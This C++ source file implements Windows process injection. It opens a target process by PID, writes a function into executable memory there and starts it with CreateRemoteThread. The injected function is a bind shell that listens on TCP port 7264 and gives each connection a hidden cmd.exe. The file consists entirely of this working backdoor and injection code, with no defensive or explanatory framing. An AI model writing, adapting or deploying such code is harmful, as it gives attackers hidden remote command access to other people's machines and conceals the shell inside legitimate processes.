//
// Created by lkw on 2023/10/11.
//

#include "ShellIj.h"

// 调用的远程Shell代码
void __stdcall Shell(PARAMETROS* ptr)
{
    STARTUPINFO si;
    struct sockaddr_in sa;
    PROCESS_INFORMATION pi;
    int s, n;
    WSADATA HWSAdata;

    // 通过GetProcAddress获取到ws2.dll中的所有函数地址
    ptr->WSAHandle = (HANDLE)(*ptr->KernelLoadLibrary)(ptr->wsastring);
    ptr->ShellWsaStartup = (WSASTARTUP)(*ptr->KernelGetProcAddress)((HINSTANCE)ptr->WSAHandle, ptr->wsastartupstring);
    ptr->ShellWSASocket = (WSASOCKET)(*ptr->KernelGetProcAddress)((HINSTANCE)ptr->WSAHandle, ptr->WSASocketString);
    ptr->ShellWsaConnect = (WSACONNECT)(*ptr->KernelGetProcAddress)((HINSTANCE)ptr->WSAHandle, ptr->WSAConnectstring);
    ptr->ShellBind = (BIND)(*ptr->KernelGetProcAddress)((HINSTANCE)ptr->WSAHandle, ptr->bindstring);
    ptr->ShellAccept = (ACCEPT)(*ptr->KernelGetProcAddress)((HINSTANCE)ptr->WSAHandle, ptr->acceptstring);
    ptr->ShellListen = (LISTEN)(*ptr->KernelGetProcAddress)((HINSTANCE)ptr->WSAHandle, ptr->listenstring);

    // 通过GetProcAddress获取到kernel32.dll中的所有函数地址
    ptr->KernelHandle = (HANDLE)(*ptr->KernelLoadLibrary)(ptr->kernelstring);
    ptr->KernelCreateProcess = (CREATEPROCESS)(*ptr->KernelGetProcAddress)((HINSTANCE)ptr->KernelHandle, ptr->CreateProcessstring);
    ptr->ShellWsaStartup(0x101, &HWSAdata);

    s = ptr->ShellWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = ptr->port;
    sa.sin_addr.s_addr = 0;
    ptr->ShellBind(s, (struct sockaddr*)&sa, 16);
    ptr->ShellListen(s, 1);

    while (1)
    {
        n = ptr->ShellAccept(s, (struct sockaddr*)&sa, NULL);
        si.cb = sizeof(si);
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES; // 0x101
        si.hStdInput = si.hStdOutput = si.hStdError = (void*)n;
        si.lpDesktop = si.lpTitle = (char*)0x0000;
        si.lpReserved2 = NULL;
        ptr->KernelCreateProcess(NULL, ptr->cmd, NULL, NULL, TRUE, 0, NULL, NULL, (STARTUPINFO*)&si, &pi);
    }
}

void ShellIj::Init(int PID) {
    void* p = NULL;
    HANDLE hProcess;
    PARAMETROS parametros, * remote;

    memset((void*)&parametros, 0, sizeof(PARAMETROS));
    strncpy(parametros.cmd, "cmd", sizeof("cmd") - 1);
    parametros.port = htons((unsigned short)7264);

    printf("[-] PID = %d \n", PID);
    // 获取到动态链接库加载函数地址
    parametros.KernelHandle = LoadLibrary("kernel32.dll");
    parametros.KernelLoadLibrary = (LOADLIBRARY)GetProcAddress((HINSTANCE)parametros.KernelHandle, "LoadLibraryA");
    parametros.KernelGetProcAddress = (GETPROCADDRESS)GetProcAddress((HINSTANCE)parametros.KernelHandle, "GetProcAddress");

    // 拷贝 winsock 字符串
    strcpy(parametros.wsastring, "ws2_32.dll");
    strcpy(parametros.wsastartupstring, "WSAStartup");
    strcpy(parametros.WSASocketString, "WSASocketW");
    strcpy(parametros.WSAConnectstring, "WSAConnect");
    strcpy(parametros.bindstring, "bind");
    strcpy(parametros.acceptstring, "accept");
    strcpy(parametros.listenstring, "listen");

    // 拷贝 kernel32 字符串
    strcpy(parametros.kernelstring, "kernel32.dll");
    strcpy(parametros.CreateProcessstring, "CreateProcessA");

    // 开始注入代码
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    p = VirtualAllocEx(hProcess, 0, 4096 * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    remote = (PARAMETROS*)VirtualAllocEx(hProcess, 0, sizeof(parametros), MEM_COMMIT, PAGE_READWRITE);

    WriteProcessMemory(hProcess, p, (void*) &Shell, 4096 * 2, 0);
    WriteProcessMemory(hProcess, remote, &parametros, sizeof(PARAMETROS), 0);
    CreateRemoteThread(hProcess, 0, 0, (DWORD(__stdcall*)(void*)) p, remote, 0, 0);
    // CreateRemoteThread(hProcess, 0, 0, (DWORD(WINAPI *)(void *)) p, remote, 0, 0);

}
